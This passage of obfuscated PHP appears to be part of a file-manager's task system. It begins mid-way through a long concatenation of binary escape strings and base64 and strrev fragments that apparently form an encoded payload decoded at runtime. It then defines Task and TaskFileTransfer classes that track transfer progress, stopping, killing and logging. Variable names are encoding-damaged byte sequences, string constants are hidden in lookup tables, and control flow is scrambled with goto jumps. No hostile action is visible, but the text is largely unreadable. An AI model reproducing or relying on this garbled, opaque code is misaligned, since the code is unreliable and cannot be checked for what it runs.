xcc\x6c\x3e\x91\xbd\x33\x8b\xe9\xc2\xbe\xa5\x30\x75\x2e\x64\xf8\x2b\x92\x15\x7e\xad\x8c\xb5\xbc\x60\x86\xce\x52\xe9\x78\x84\x60\x72\x93\x45\x9\xce\x96"."\x1\xac\xc\x6b\x3a\xf1\xf6\x9a\xb5\xbc\xf\xa\xf0\xc0\xa2\x49\x61\xab\x84\x78\xf7\x15\x3d\xda\xa2\x52\xbc\x1f\x5c\x9f\x10\x80\x34\xec\x53\x56\x18\x18\x7e\x3d\x8e\x4d\xa2\xa9\x22\x24".base64_decode('o0scHNEYsPiK3cUUQYmNC3m4qaIS2rhYzjzahpmtApjJPrhJMG08Q4zQVIachg==')."\x25\x82\xb5\x57\x2c\xa5\x19\x88\xe5\x1a\x54\x88\xb9\xa\x93\xcd\x3b\x5a\x3b\xdc\xc\xd4\x48\x87\x89\x59\x9d\x12\xc1\x8e\x3f\x5\x44\xf4\xba\x88\xbd\xc8\x20\x18\x77\x6d\x90\x2c\x30\x6f"."\35\123\350\241\357\215\16\146\325\204\24\10\266\370\275\236\100\223\77\74\117\202\76\20\270\362\0\362\340\154\135\356\350\270\12\117\16\305\374\70\163\142\14\203\316\70"."\x60\x3c\x9d\x49\xc6\x8e\x1b\x9c\xf1\x16\xf4\x7c\x84\x37\xa\xac\xd5\x62\x1c\x55\xf4\xa2\x1a\x1\x1b\x9f\xb5\x12\x4\x54\x6\x1e\xc2\x95\xc8\x9d\xe1\x67\x52\x42\xe6\xbc\xae\x14\xe7\x1f"."\126\320\243\241\274\305\102\201\102\211\326\220\374\245\277\0\226\210\65\67\330\254\225\334\150\215\127\163\3\252\241\162\342\100\113\14\213\265\363\143\106\235\371\321\116\212"."\156\267\205\31\340\203\215\277\122\354\220\203\270\132\20\175\310\332\304\146\74\115\242\347\226\74\75\64\47\57\340\160\117\356\50\52\370\330\317\353\262\152\50\2\0\73".base64_decode('e59EdN3lTMbyxEsmJUQL1l225Kdi+AMUJjiHKZUhBJ/k/F83VU1y/xBqkt7PMw==').strrev('ú>ùr'."\0".'üÁd∂È˚∞°‹òàzÃ˙~#∑ò!¿ë}¿éÙYøDæ+ÿæÏ~˝').base64_decode('73ncSTcbYhyAvmh89MAXRjiTDLOT2uDnsJgEhDZ44UHZaXraAugBGWfLPaftbQ==').strrev('ÿ$ãMÊÀ·?Úˇ}©≥Hmœ‚·:RıH2¡~$ÂÎ—´≈@o¢Õ·Âüöª')."\x2a\xaa\xe9\xa\x43\x8c\x1\x88\x79\xe1\xdc\x3f\x54\x16\xd1\xb2\xc3\x45\x0\xcb\x89\x44\x80\xb6\x8b\x29\x9a\x41\x57\xd8\xb9\x94\x26\xe\x3\xa2\x9f\x50\xe7\x1a\x3f\x1c\x83\x45\x4e\x7"."\x60\xdf\x15\xb3\xd8\xa5\x3e\x2e\xfe\x7f\x29\x88\x13\xc3\x82\xfa\x9d\xb5\x92\xe2\x6\x19\xf6\xdd\x8b\x73\x52\xf0\xb5\x80\xb4\x36\x68\x7d\x46\x6\x42\xec\xef\x3\x58\x5e\x6\x10\x70\x1f"."\31\245\212\157\31\120\57\362\200\111\265\74\4\41\124\70\21\377\104\311\57\335\123\354\125\143\52\102\276\136\311\120\305\153\171\67\134\0\264\51\134\172\104\245\340\225".base64_decode('v0xfIqOPEAhYxt4lYI/G8AWK3iJpGiWfDSxZHalz//R8v7P6FGeXfEztC6nfiQ==').base64_decode('HuIjWkTucWBOC1IoHmscFsOiBiTqNEik5zhJNulzhAz0MZekA700gsmW/TUbYQ==').strrev('ê]P,øÕèŒBâí%Í?>r‹É'."\r".'í–LIH}5Cö¬9qh…Óñ(Z1π').strrev('(óK´ë˛* ‚6jæ¯ª•L≥d°ÿøÔIV-∫B◊|µvH_-¬ı|TD¬')."\46\221\14\322\154\211\117\260\145\115\102\204\0\274\252\3\5\320\242\27\331\352\37\201\62\74\264\276\167\204\21\26\375\64\51\51\46\143\300\70\337\137\105\243\127\176"."\117\156\177\143\205\176\206\75\30\343\300\75\343\257\135\341\347\141\34\354\51\30\7\366\76\344\40\17\300\70\270\5\323\217\75\231\304\137\237\263\76\131\7\333\314\64"."\345\212\230\175\73\237\317\206\312\126\40\144\37\270\210\126\174\372\307\157\11\163\205\54\277\167\5\21\253\334\123\324\141\241\207\5\75\343\100\167\244\16\352\343\305\66".strrev('3Y6aa•z*¬˚ì\\+¶.∞Z¶œdœzu«fÍuJ“L¬DòV^ˇ√îÃ‚Wº')."\145\352\114\361\320\200\317\17\277\277\41\356\2\211\33\64\162\211\104\30\0\76\361\222\25\255\44\352\207\113\134\276\50\321\252\322\132\374\140\223\215\20\377\357\26\0".base64_decode('Z7xxVkHBtPj1tqKBQLgoqGUI25jtDl6DV+MGX0V44+LPNFm/hbfyEv0Qth++IA==')."\360\53\71\132\6\212\260\131\170\14\153\352\262\125\26\53\45\162\240\221\240\362\215\212\136\124\124\354\155\107\3\103\16\53\170\262\40\223\210\65\232\232\375\244\5\26"."\x87\xdb\x13\x3a\xe8\xb\xe6\x32\x64\xb3\x85\x6\x9a\x7c\x69\x9\x94\xe5\x7f\x31\x81\x54\xec\xc0\x12\xa\xd7\xc0\x28\xd1\x73\xf7\x5c\x4a\x3e\x4a\xbc\x82\x24\x5c\x63\xff\x48\xbb\x31\xa7".base64_decode('xUQsp2w6BYQUTucUM4gmmPAsXOKz9tVWPSjG6+h2SKNlKma3hMeSuJsKgdGCpQ==')."\251\45\330\50\2\63\245\121\342\63\120\146\232\113\4\170\205\132\126\253\340\335\116\64\215\101\25\211\313\240\270\152\164\6\103\332\113\226\153\153\44\322\201\255\237\74"."\55\314\42\112\26\24\144\340\320\11\257\240\151\142\330\152\156\34\244\376\310\0\153\144\221\306\100\274\311\366\120\36\42\71\366\327\363\150\377\321\72\347\224\114\60\255"."\xb3\xc8\xc\xec\x71\x15\x8b\xc\x61\xd8\x5f\x19\x2\x4c\x94\xe8\xd4\xf\x44\x19\x86\x93\x2d\x93\xd0\x3a\xa4\x7b\x8c\xbf\xe6\xb0\xbf\x9d\x98\x17\x2c\x8b\x6d\xaf\xbd\xa\xc7\xa1\xd6\x77".base64_decode('XC0WiNChgm1ZU7tGw/YOGPb2hsOU//5/fkvx/9cTilOZx2fLO3sthK2lPNhiwQ==')."\245\43\76\64\265\365\303\272\61\36\52\246\22\14\165\130\142\44\302\27\34\334\161\134\266\47\155\135\114\31\223\72\340\240\176\71\144\172\51\43\147\62\174\253\55\172".base64_decode('lQxgZB97PqtUpPg5TAvyUS6TNzOnJvpKXBXCKQhYHSAKvEFRNk6fAAtBXY64aQ==')."\50\1\205\53\310\100\122\262\50\32\316\5\363\124\14\253\44\224\270\173\56\45\37\310\24\227\120\21\221\162\130\100\105\364\46\142\331\5\55\100\161\170\370\33\262\56"."\xeb\x2b\xa6\xa4\x44\x9b\xed\x75\x28\x9c\xc9\x10\xc7\xd6\x72\x62\x5d\x7c\x73\x5c\x5c\x9a\x2d\x66\xb1\x8\x54\x4e\xb5\x1e\xdc\xb0\xa7\x33\xab\xec\x6f\x69\x56\x3b\x8b\x3f\x86\x75\xc3\xe1"."\xa1\x43\x8\x8a\xf9\x14\x21\xd1\xa5\x6\xba\x74\x2c\x51\x6\x2f\xcb\x30\xcf\x33\xa\xfa\x97\x5e\x84\xec\xe1\x53\x2e\xeb\xc2\x90\xd8\x5f\xba\x98\x3b\x74\xd\x31\x60\x56\x28\x3b\xfa\x10"."\xf4\x2\x85\x77\x1c\x8b\x5e\x62\xb3\x5d\xe\x0\xa1\x88\xdf\x96\xa9\x1a\x72\x70\x4a\xba\x1d\xee\x6c\xab\x40\xe6\xd\x4\x53\x1\x4f\x2f\x3c\xde\x6c\x66\xf3\xf8\x48\x4c\xdc\x43\xa9\xed".base64_decode('kKCWS0CWgytDdNtsLQkVra0rZU6pbAlNN4RsDF4qL3zszrSMJvc6a/c2iwRgLA==').base64_decode('01pEW3I1KYKEmzvA3iatPqRRIgJTN1b0RW9+92S9+mMuPosoVUENCMmoFPWJAg==').base64_decode('fqENlZ8bm6NkfGLuGZBNeoFmL2V9E1O4KEwg3PEV3wXxKyph86fFoAjCaa0NLg==')."\20\177\116\355\344\1\176\375\303\271\337\144\222\275\310\152\311\232\244\374\77\203\2\10\177\274\25\362\72\202\131\46\327\4\126\6\355\117\352\271\104\123\116\113\306\142"."\x28\x37\xdb\x14\xca\xf3\x9b\x0\xde\x4d\x8\x2b\xd5\x7d\xb4\x64\xac\xc5\x45\xb3\x50\x86\x54\x1c\x84\x1d\x10\x33\x15\x1a\x41\xd2\x80\x1a\xed\x5c\xb7\x6\x77\x85\x49\xcf\xfc\x93\x56\x23"."\x54\x96\x8d\xcd\x19\xc8\x83\xec\x7\x9c\x16\xa8\x4d\x76\x82\x67\x11\x74\x1b\xb7\x25\x19\xe2\x63\xb3\xd6\xfb\x3f\x51\x9c\x17\x50\x40\xc9\x4\x84\xea\xc4\xbb\xc1\x51\xb\x84\x4b\x7f\x84"."\x63\xa5\x75\x88\x5\x83\x5d\x9e\x40\x37\x2b\xcd\x32\xf8\x2\xb1\x63\x1d\x23\x39\x43\x62\xa2\xa5\x39\xf6\xa9\x45\x6c\x3f\x47\x5f\xc\xcc\xa2\xe3\x4e\x9c\xe6\xb1\x26\xe1\xfc\x8a\xad\xf5"."\142\1\173\317\160\11\143\120\65\23\151\101\26\51\116\54\206\353\105\203\112\76\124\272\275\366\126\321\61\265\113\150\274\222\242\366\10\12\6\21\255\104\31\334\242\222"._kodDe('L1+0aQGMAX/goYX7khvwgnrIT1ORR0m/J7n/YYgHsGqUcrSTNlPr/XhTyotQo2Q=').base64_decode('8SyZufhzBOPsudGxQOlWcGnedolbqhUlM4/aihLPPBP3YCVoLU0pQV35jX8xHQ==').strrev('zHZ\'w¥	ü∆ƒÄíuCãÉ`á™√}.JÑ;´JïHî—ΩèpùpÙ%iÁ')."\x21\xd7\x97\xd3\xd8\x36\x91\xe4\x9a\x63\x50\x31\x95\x3d\xa6\xcb\x3e\x57\x54\x9b\x15\x35\x73\x5\x41\xa7\xb4\xa4\x32\xb1\x3\x3d\x1e\x5f\x24\xc9\x66\xe8\xdb\x39\xa2\x16\x36\x96\x5a\x34"."\x53\x4d\x8\xba\x50\x5c\x23\x95\x75\x53\xe5\x6c\x7c\x86\x1f\xc0\x71\x47\xe0\x25\x56\x9\x8\x72\xe9\xdf\x72\x3d\x5e\xe2\xb4\x8\x81\x8\xfb\xc6\x8f\x9e\x2d\x3a\xea\x98\x1f\x20\x67\xee"."\xf8\xe6\xcd\xb\x2f\x6a\xd9\x75\xb\x14\xb7\x1c\x78\xff\xc4\xc9\x61\x4d\x37\x1d\x30\x2d\xa2\xe5\xd1\x6f\xa3\x66\x9a\xfc\x42\x19\xcb\xd4\x88\xe9\x83\x9b\xa0\x43\xd0\x8b\x0\x21\x7e\xb7"."\2\107\25\35\367\43\364\104\144\4\5\311\35\40\24\100\303\12\116\105\304\307\22\201\327\10\54\42\356\161\344\56\260\271\140\273\255\344\0\40\124\306\265\41\352\12".base64_decode('Dtq+8vbwN3llO2PHeRKCf6KWB7IwNtw4xU2c6DpRHU7iZKU332Mpjp8TYNqNPw==')."\x56\x3\x39\xab\xe4\x55\x60\xe7\x9a\xe8\x98\x9\xba\x99\xf5\x2d\xf0\x87\x23\xe1\xa2\xa4\xe\x4f\x38\x3c\x3f\x18\x6a\xc2\xbe\x38\x8b\x92\x51\x29\x41\xa1\xa6\x28\xa9\xa3\x35\xd8\x3e\x5a"."\x9a\xaf\xcd\xe3\xf\x14\xa5\x41\x5\x9b\xf6\x18\xf7\x15\x84\x93\xfc\x1d\xa8\x95\x9e\x40\x20\x38\x7f\xb4\x56\xf8\xbd\xf3\x78\x4b\xd0\x5\x2b\x3f\x2\xcf\xa7\x35\x7a\xb2\x4d\x6f\xa\xc2"."\162\206\312\326\202\331\234\222\345\116\243\170\31\353\221\201\70\257\6\365\247\306\2\126\217\365\66\135\67\212\260\244\42\250\34\323\116\352\16\321\27\241\240\157\122\266"."\xd8\x19\xf3\x8c\x3a\x24\xea\xd4\xf1\x2b\x64\x97\xe5\xaa\x59\x80\xa3\xc5\x82\x48\x8e\x80\x84\xe2\x6e\x8b\x0\x93\x4a\x8e\x98\x78\x9e\x5a\x7c\xbe\x8f\x52\xf9\x88\xc0\x96\x9e\xa9\x11\x75"."\254\136\55\56\234\337\143\131\206\330\262\221\61\26\64\242\160\230\44\377\17\120\220\106\301\170\237\0\0".base64_decode('')."", 10, -8))); goto b¬∏øÉ’‰É; e›ò´»®óà: class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\156\x67"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($f›¿±ä∂ ‰, $BŒÚ”â˜∑≤ = '', $aéﬂŸ∫ı£ä = 0, $cÍ∞⁄‡û≈â = '') { goto Eêßç±µ»®; Eêßç±µ»®: $B€±éπÇè¶ =& $_SERVER[Öíæ€“”≠éÏË]; if (self::get($f›¿±ä∂ ‰)) { return; } $this->task = array($B€±éπÇè¶[394] => $f›¿±ä∂ ‰, $B€±éπÇè¶[1538] => USER_ID, $B€±éπÇè¶[1441] => $cÍ∞⁄‡û≈â, $B€±éπÇè¶[29] => $BŒÚ”â˜∑≤, $B€±éπÇè¶[1033] => $B€±éπÇè¶[33], $B€±éπÇè¶[1031] => $aéﬂŸ∫ı£ä, $B€±éπÇè¶[1045] => 0, $B€±éπÇè¶[1539] => 0, $B€±éπÇè¶[1540] => 0, $B€±éπÇè¶[762] => timeFloat(), $B€±éπÇè¶[761] => 0, $B€±éπÇè¶[1541] => 0, $B€±éπÇè¶[1542] => 0, $B€±éπÇè¶[1543] => 0, $B€±éπÇè¶[723] => $B€±éπÇè¶[1501]); goto FﬂÕîëÉÙ“; Bå‰¥Ã°‘ì: $this->startAfter(); Hook::trigger($B€±éπÇè¶[1548], $this->task); $this->task[$B€±éπÇè¶[1541]] = timeFloat(); goto c≥ñá¥˘Áª; FﬂÕîëÉÙ“: $GLOBALS[$B€±éπÇè¶[1544]] = 1; Hook::bind($B€±éπÇè¶[1503], array($this, $B€±éπÇè¶[1545])); Hook::bind($B€±éπÇè¶[1546], array($this, $B€±éπÇè¶[1547])); goto Bå‰¥Ã°‘ì; c≥ñá¥˘Áª: } public function end() { goto cÀ†£æì£œ; bÜ©¡ı‹ï£: $D†¨æ©ÕÖû = timeFloat() - $this->task[$bËû Ü∏∫Ç[762]]; self::log($bËû Ü∏∫Ç[1549] . $this->task[$bËû Ü∏∫Ç[394]] . $bËû Ü∏∫Ç[1550] . $D†¨æ©ÕÖû . $bËû Ü∏∫Ç[1551]); Hook::unbind($bËû Ü∏∫Ç[1503], array($this, $bËû Ü∏∫Ç[1545])); goto d‘¡¢–Ëûó; d‘¡¢–Ëûó: Hook::unbind($bËû Ü∏∫Ç[1546], array($this, $bËû Ü∏∫Ç[1547])); $this->endAfter(); $this->task = !1; goto A£Ê±ËØÔ‹; cÀ†£æì£œ: $bËû Ü∏∫Ç =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->task) { return; } if ($this->task[$bËû Ü∏∫Ç[1541]]) { self::valueSet($this->task[$bËû Ü∏∫Ç[394]], !1); } goto bÜ©¡ı‹ï£; A£Ê±ËØÔ‹: } public function update($E‰‡åƒßƒÔ = 0, $fÕèáú÷Ã© = false) { goto bΩ„ﬁÓö·—; dÂı¯∏ÑË˜: $aò‹›¨“â’ = self::get($d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[394]]); $D€ÛõÂÂªŒ = $aò‹›¨“â’[$BªÜ∞ÇõÏ∆[723]]; if ($D€ÛõÂÂªŒ == self::STATYS_KILL) { $EÛ‡ﬁÉõÚû = array($BªÜ∞ÇõÏ∆[1552] => LNG($BªÜ∞ÇõÏ∆[1553]), $BªÜ∞ÇõÏ∆[1095] => !1); Cache::set($BªÜ∞ÇõÏ∆[1554] . $this->task[$BªÜ∞ÇõÏ∆[394]], $EÛ‡ﬁÉõÚû, 30); $this->onKill(); $this->end(); die; } else { if ($D€ÛõÂÂªŒ == self::STATYS_STOP) { $eâôÆº≤ƒ– = 2; $aò‹›¨“â’[$BªÜ∞ÇõÏ∆[1542]] += $eâôÆº≤ƒ–; self::valueSet($d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[394]], $aò‹›¨“â’); sleep($eâôÆº≤ƒ–); $this->update(); return; } } goto Dõ ©¡Ù∫…; e”™∑ÁÊêã: $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1045]] += $E‰‡åƒßƒÔ; $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[761]] = timeFloat(); if ($d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1031]]) { if ($d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1031]] < $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1045]]) { $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1031]] = $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1045]]; } $B∂ÒÇØìã‡ = timeFloat() - $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[762]] - $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1542]]; $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1539]] = $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1045]] / $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1031]]; $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1540]] = $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1045]] / $B∂ÒÇØìã‡; if ($d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1539]] > 0) { $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1543]] = $B∂ÒÇØìã‡ * (1 - $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1539]]) / $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1539]]; } $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1543]] = $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1543]] <= 0 ? 0 : $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1543]]; } goto a®¶ñéõ≈ù; D•‹”‡“ÏÈ: Hook::trigger($BªÜ∞ÇõÏ∆[1555], $d·ƒÀÇ¥çæ); self::valueSet($d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[394]], $d·ƒÀÇ¥çæ); goto dÛ Ì◊±Â‹; Dõ ©¡Ù∫…: $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[723]] = $D€ÛõÂÂªŒ ? $D€ÛõÂÂªŒ : $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[723]]; $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1542]] = $aò‹›¨“â’[$BªÜ∞ÇõÏ∆[1542]] ? $aò‹›¨“â’[$BªÜ∞ÇõÏ∆[1542]] : 0; $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1541]] = timeFloat(); goto D•‹”‡“ÏÈ; bΩ„ﬁÓö·—: $BªÜ∞ÇõÏ∆ =& $_SERVER[Öíæ€“”≠éÏË]; $d·ƒÀÇ¥çæ =& $this->task; if (!$d·ƒÀÇ¥çæ) { return; } goto e”™∑ÁÊêã; a®¶ñéõ≈ù: $this->updateAfter(); $FÓÕÇÔª∑ß = 0.2; if (timeFloat() - $d·ƒÀÇ¥çæ[$BªÜ∞ÇõÏ∆[1541]] < $FÓÕÇÔª∑ß && !$fÕèáú÷Ã©) { return; } goto dÂı¯∏ÑË˜; dÛ Ì◊±Â‹: } public function onKillSet($c•◊››∑Çπ, $EãÔÁ›ñÿÍ = array()) { $this->onKillCall = array($c•◊››∑Çπ, $EãÔÁ›ñÿÍ); } public function onKill() { $aœ‡“ÂïËÛ =& $_SERVER[Öíæ€“”≠éÏË]; self::log($aœ‡“ÂïËÛ[1549] . $this->task[$aœ‡“ÂïËÛ[394]] . $aœ‡“ÂïËÛ[1556]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Aˆä›¶Êò”) { $cå˘¨êÑ”è =& $_SERVER[Öíæ€“”≠éÏË]; Cache::set($cå˘¨êÑ”è[1554] . $this->task[$cå˘¨êÑ”è[394]], $Aˆä›¶Êò”, 60); return $Aˆä›¶Êò”; } public static function get($d«ÍÖÿ„›æ) { $dñ†Êêúªø =& $_SERVER[Öíæ€“”≠éÏË]; $C©Úö˘›Úﬂ = self::valueGet($d«ÍÖÿ„›æ); if (is_array($C©Úö˘›Úﬂ) && $C©Úö˘›Úﬂ[$dñ†Êêúªø[1557]]) { $E“Ëí©Üﬂ∞ = ActionApply($C©Úö˘›Úﬂ[$dñ†Êêúªø[1557]], array($C©Úö˘›Úﬂ)); $C©Úö˘›Úﬂ = is_array($E“Ëí©Üﬂ∞) ? $E“Ëí©Üﬂ∞ : $C©Úö˘›Úﬂ; } return $C©Úö˘›Úﬂ; } public static function listData() { $e÷èµÆÉö˘ = self::valueGet(); return array_sort_by($e÷èµÆÉö˘, $_SERVER[Öíæ€“”≠éÏË][762], !0); } public static function kill($eÍ±Á®ÜπØ) { return self::changeStatus($eÍ±Á®ÜπØ, self::STATYS_KILL); } public static function stop($fè™Á…ÓØ“) { return self::changeStatus($fè™Á…ÓØ“, self::STATYS_STOP); } public static function restart($aÿÛ°äæ‹ÿ) { return self::changeStatus($aÿÛ°äæ‹ÿ, self::STATYS_RUNNING); } public static function killAll() { $eÃÇﬂ‹¡∑‡ =& $_SERVER[Öíæ€“”≠éÏË]; $bí≈±¿íõ™ = self::listData(); foreach ($bí≈±¿íõ™ as $fúÙßµ¡ÃÜ) { self::kill($fúÙßµ¡ÃÜ[$eÃÇﬂ‹¡∑‡[394]]); } sleep(2); foreach ($bí≈±¿íõ™ as $fúÙßµ¡ÃÜ) { self::valueSet($fúÙßµ¡ÃÜ[$eÃÇﬂ‹¡∑‡[394]], !1); } } private static function changeStatus($fÒ©‡·—Úè, $Aùñ√Ê€úà) { goto dÓ’ºãàÛÖ; dÓ’ºãàÛÖ: $d…∏ë∆ì‰∞ =& $_SERVER[Öíæ€“”≠éÏË]; $aƒõ›ŒâÇ· = self::valueGet($fÒ©‡·—Úè); if (!$aƒõ›ŒâÇ·) { return !1; } goto E„åﬂÕáÖÏ; Fò‹œÀ±Òü: return !0; goto b´®Œ¬ø⁄; E„åﬂÕáÖÏ: $aƒõ›ŒâÇ·[$d…∏ë∆ì‰∞[723]] = $Aùñ√Ê€úà; self::valueSet($fÒ©‡·—Úè, $aƒõ›ŒâÇ·); self::log($d…∏ë∆ì‰∞[1558] . $aƒõ›ŒâÇ·[$d…∏ë∆ì‰∞[394]] . $d…∏ë∆ì‰∞[1559] . $Aùñ√Ê€úà); goto Fò‹œÀ±Òü; b´®Œ¬ø⁄: } public static function valueGet($dÎ”ëË€˜Æ = false) { $càëËŸ±öÜ =& $_SERVER[Öíæ€“”≠éÏË]; if ($dÎ”ëË€˜Æ) { $FÒ«≥ƒ’àË = Model($càëËŸ±öÜ[426])->where(array($càëËŸ±öÜ[93] => $dÎ”ëË€˜Æ, $càëËŸ±öÜ[29] => $càëËŸ±öÜ[1560]))->find(); return $FÒ«≥ƒ’àË ? json_decode($FÒ«≥ƒ’àË[$càëËŸ±öÜ[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Açß§Ω§ÓÉ = false) { goto DÁÏÂ◊åçŒ; DÁÏÂ◊åçŒ: $e¢ÉôÍêÆÍ =& $_SERVER[Öíæ€“”≠éÏË]; $aÀÛõù¨∞Ë = array($e¢ÉôÍêÆÍ[29] => $e¢ÉôÍêÆÍ[1560]); if ($Açß§Ω§ÓÉ) { $aÀÛõù¨∞Ë[$e¢ÉôÍêÆÍ[1538]] = $Açß§Ω§ÓÉ; } goto Bºﬂâ£§úà; A™åü∞Ë€∞: return $fÑı€±í´§; goto fƒ•∆ùïÑﬁ; Bºﬂâ£§úà: $fÑı€±í´§ = Model($e¢ÉôÍêÆÍ[426])->where($aÀÛõù¨∞Ë)->select(); $fÑı€±í´§ = $fÑı€±í´§ ? $fÑı€±í´§ : array(); foreach ($fÑı€±í´§ as $F√–í √ñ≥ => $Bè›∏£ºÚÂ) { $fÑı€±í´§[$F√–í √ñ≥] = json_decode($Bè›∏£ºÚÂ[$e¢ÉôÍêÆÍ[372]], !0); } goto A™åü∞Ë€∞; fƒ•∆ùïÑﬁ: } public static function valueSet($aºé·¨Ñ÷ñ, $dÎÖ®ÚÜÆÆ) { goto D‘Ó◊‹ÖÖÇ; D‘Ó◊‹ÖÖÇ: $BÊÇÆÁπá• =& $_SERVER[Öíæ€“”≠éÏË]; if (!$dÎÖ®ÚÜÆÆ) { return Model($BÊÇÆÁπá•[426])->where(array($BÊÇÆÁπá•[93] => $aºé·¨Ñ÷ñ, $BÊÇÆÁπá•[29] => $BÊÇÆÁπá•[1560]))->delete(); } $cı£é∑±º∂ = json_encode($dÎÖ®ÚÜÆÆ); goto EÔåÿ¯€Ë£; A…ûæßâ∏ö: $D∑±∑é”¿Ç = $BÊÇÆÁπá•[1562]; CacheLock::lock($D∑±∑é”¿Ç); Model($BÊÇÆÁπá•[426])->add($D¯Üü¢ù∆£, array(), !0); goto a√úŸ§ıç≥; a√úŸ§ıç≥: CacheLock::unlock($D∑±∑é”¿Ç); goto cÈ∞êÙÇÉõ; EÔåÿ¯€Ë£: if (!$cı£é∑±º∂) { ob_start(); var_dump($dÎÖ®ÚÜÆÆ); $F€’õé¡≠î = ob_get_clean(); self::log($BÊÇÆÁπá•[1561] . json_encode_force($F€’õé¡≠î)); } if (!$aºé·¨Ñ÷ñ || !$dÎÖ®ÚÜÆÆ[$BÊÇÆÁπá•[394]]) { return !1; } $D¯Üü¢ù∆£ = array($BÊÇÆÁπá•[29] => $BÊÇÆÁπá•[1560], $BÊÇÆÁπá•[1538] => USER_ID, $BÊÇÆÁπá•[93] => $aºé·¨Ñ÷ñ, $BÊÇÆÁπá•[372] => $cı£é∑±º∂); goto A…ûæßâ∏ö; cÈ∞êÙÇÉõ: } public static function log($Cπ‘ü¨∂´©) { if (!GLOBAL_DEBUG) { return; } write_log($Cπ‘ü¨∂´©, $_SERVER[Öíæ€“”≠éÏË][1563]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto aÖ¨©¿àÊß; b¡¿…—√ˆè: Hook::bind($C–ÍÃãÃä[1564], array($this, $C–ÍÃãÃä[1565])); Hook::bind($C–ÍÃãÃä[1119], array($this, $C–ÍÃãÃä[1566])); Hook::bind($C–ÍÃãÃä[1567], array($this, $C–ÍÃãÃä[1568])); goto CÊê”∆Í¬“; fØõ∞É∏üƒ: $Cˆ–Éúçßï[$C–ÍÃãÃä[1588]] = 0; $Cˆ–Éúçßï[$C–ÍÃãÃä[1589]] = 0; if (!$Cˆ–Éúçßï[$C–ÍÃãÃä[1441]]) { $Cˆ–Éúçßï[$C–ÍÃãÃä[1441]] = LNG($C–ÍÃãÃä[1590]); } goto e‹®Âä∂ââ; bÕ∆™™Âç: $Cˆ–Éúçßï[$C–ÍÃãÃä[1033]] = $C–ÍÃãÃä[33]; $Cˆ–Éúçßï[$C–ÍÃãÃä[1586]] = $C–ÍÃãÃä[33]; $Cˆ–Éúçßï[$C–ÍÃãÃä[1587]] = 0; goto fØõ∞É∏üƒ; eËùªΩùËÊ: Hook::bind($C–ÍÃãÃä[1573], array($this, $C–ÍÃãÃä[1574])); Hook::bind($C–ÍÃãÃä[573], array($this, $C–ÍÃãÃä[1575])); $this->sourceModelCopyFlag = !1; goto aùÊâ≤«œÍ; CÊê”∆Í¬“: Hook::bind($C–ÍÃãÃä[580], array($this, $C–ÍÃãÃä[1569])); Hook::bind($C–ÍÃãÃä[581], array($this, $C–ÍÃãÃä[1570])); Hook::bind($C–ÍÃãÃä[583], array($this, $C–ÍÃãÃä[1571])); goto DâΩ∆Ç”∫È; aùÊâ≤«œÍ: Hook::bind($C–ÍÃãÃä[1576], array($this, $C–ÍÃãÃä[1577])); Hook::bind($C–ÍÃãÃä[1578], array($this, $C–ÍÃãÃä[1579])); Hook::bind($C–ÍÃãÃä[1580], array($this, $C–ÍÃãÃä[1581])); goto C¥è¡ﬂΩ◊Ü; C¥è¡ﬂΩ◊Ü: $Cˆ–Éúçßï[$C–ÍÃãÃä[1582]] = LNG($C–ÍÃãÃä[1583]); $Cˆ–Éúçßï[$C–ÍÃãÃä[1584]] = 0; $Cˆ–Éúçßï[$C–ÍÃãÃä[1585]] = 0; goto bÕ∆™™Âç; DâΩ∆Ç”∫È: Hook::bind($C–ÍÃãÃä[584], array($this, $C–ÍÃãÃä[1571])); Hook::bind($C–ÍÃãÃä[551], array($this, $C–ÍÃãÃä[1572])); Hook::bind($C–ÍÃãÃä[548], array($this, $C–ÍÃãÃä[1572])); goto aî¥ÖÛ‚ùó; aÖ¨©¿àÊß: $C–ÍÃãÃä =& $_SERVER[Öíæ€“”≠éÏË]; $Cˆ–Éúçßï =& $this->task; $this->sourceCopyFolder = !1; goto b¡¿…—√ˆè; aî¥ÖÛ‚ùó: Hook::bind($C–ÍÃãÃä[553], array($this, $C–ÍÃãÃä[1572])); Hook::bind($C–ÍÃãÃä[555], array($this, $C–ÍÃãÃä[1572])); 